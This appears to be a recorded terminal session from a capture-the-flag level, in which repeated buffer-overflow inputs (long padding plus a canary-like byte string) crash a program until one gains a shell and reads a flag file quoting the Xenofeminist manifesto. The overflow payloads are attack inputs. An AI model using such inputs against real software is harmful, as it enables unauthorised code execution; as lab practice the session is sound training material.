+==> aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaatweet!Xxxxxxxxxxxxxxιÿÿÿ
+
+The canary says: tweet!Xxxxxxxxxxxxxxιÿÿÿ
+Segmentation fault (core dumped)
+==> aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaatweet!Xxxxxxxxxxxxxxxιÿÿÿ
+
+The canary says: tweet!Xxxxxxxxxxxxxxxιÿÿÿ
+Segmentation fault (core dumped)
+==> aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaatweet!Xxxxxxxxxxxxxxxxιÿÿÿ
+
+The canary says: tweet!Xxxxxxxxxxxxxxxxιÿÿÿ
+Segmentation fault (core dumped)
+==> aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaatweet!Xxxxxxxxxxxxxxxxxιÿÿÿ
+
+The canary says: tweet!Xxxxxxxxxxxxxxxxxιÿÿÿ
+Segmentation fault (core dumped)
+==> aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaatweet!Xxxxxxxxxxxxxxxxxxιÿÿÿ
+
+The canary says: tweet!Xxxxxxxxxxxxxxxxxxιÿÿÿ
+$ whoami
+overflow
+$ ls
+hint  overflow	overflow.txt
+$ cat over	flow.txt
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+                      __ _               
+  _____   _____ _ __ / _| | _____      __
+ / _ \ \ / / _ \ '__| |_| |/ _ \ \ /\ / /
+| (_) \ V /  __/ |  |  _| | (_) \ V  V / 
+ \___/ \_/ \___|_|  |_| |_|\___/ \_/\_/  
+                                         
+
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+
+0x18 XF asserts that adapting our behaviour for an era of Promethean
+complexity is a labour requiring patience, but a ferocious patience at
+odds with "waiting". Calibrating a political hegemony or insurgent
+memeplex not only implies the creation of material infra/structures to
+make the values it articulates explicit, but places demands on us
+subjects, as to how were are to become hosts of this new world. How do
+we build a better semiotic parasite--one that arouses the desires we
+want to desire, that orchestrates not an autophagic orgy of indignity
+or rage, but an emancipatory and egalitarian community buttressed by
+new forms of unselfish solidarity and collective self-mastery?
+
+
+0x19 Is xenofeminism a programme? Not if this means anything so crude
+as a recipe, or a single-purpose tool by which a determinate problem
+is solved. We prefer to think like the schemer or lisper, who seeks to
+construct a new language in which the problem at hand is immersed, a
+language in which solutions for both it and an entire class of
+problems in which it is enmeshed become relatively trivial.
+Xenofeminism is a platform, an incipient ambition to construct a new
+language for sexual politics--a anguage that seizes its own methods as
+materials to be reworked, and incrementally bootstraps itself into
+existence. We understand that the problems we face are systemic and
+interlocking, and that any chance of global success depends on
+infecting myriad skills and contexts with the logic of XF. Ours is a
+transformation of seeping but directed subsumption rather than rapid
+overthrow; it is a transformation of deliberate construction, seeking
+to submerge the white-supremacist capitalist patriarchy in a sea of
+procedures that soften its shell and dismantle its defenses, so as to
+build a new world from the scraps.
+
+
+0x1A Xenofeminism indexes the desire to construct an alien future,
+with a triumphant X on a mobile map. This X is not a mark of
+destination, but the insertion of a topological-keyframe for a new
+logic to be forged. In affirming a future untethered to the repetition
+of the present, we militate for ampliative capacities, for spaces of
+freedom with a richer geometry than the aisle, the assembly line, and
+the feed.We need new affordances of perception and action unblinkered
+by naturalised identities. In the name of feminism, "Nature" shall no
+longer be a refuge of injustice, or a basis for any political
+justification whatsoever! If nature is unjust, change nature!
+
+
+
+$ echo victoru y
+victory
+$ 
+==> aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaatweet!Xxxxxxxxxxxxxxxxxxxιÿÿÿ
+
+The canary says: tweet!Xxxxxxxxxxxxxxxxxxxιÿÿÿ
+Segmentation fault (core dumped)
+==> aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaatweet!Xxxxxxxxxxxxxxxxxxxxιÿÿÿ
+
+The canary says: tweet!Xxxxxxxxxxxxxxxxxxxxιÿÿÿ
+Segmentation fault (core dumped)
+==> aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaatweet!Xxxxxxxxxxxxxxxxxxxxxιÿÿÿ
+
+The canary says: tweet!Xxxxxxxxxxxxxxxxxxxxxιÿÿÿ
+Segmentation fault (core dumped)
+==> aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaatweet!Xxxxxxxxxxxxxxxxxxxxxxιÿÿÿ
+
+The canary says: tweet!Xxxxxxxxxxxxxxxxxxxxxxιÿÿÿ
+Segmentation fault (core dumped)
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m OVERFLOW[01;32m )Oo=-[00;32m
+[00;31m=[01;31m=> [mexit
+
+Script done on Tue 22 Sep 2015 02:39:21 AM UTC
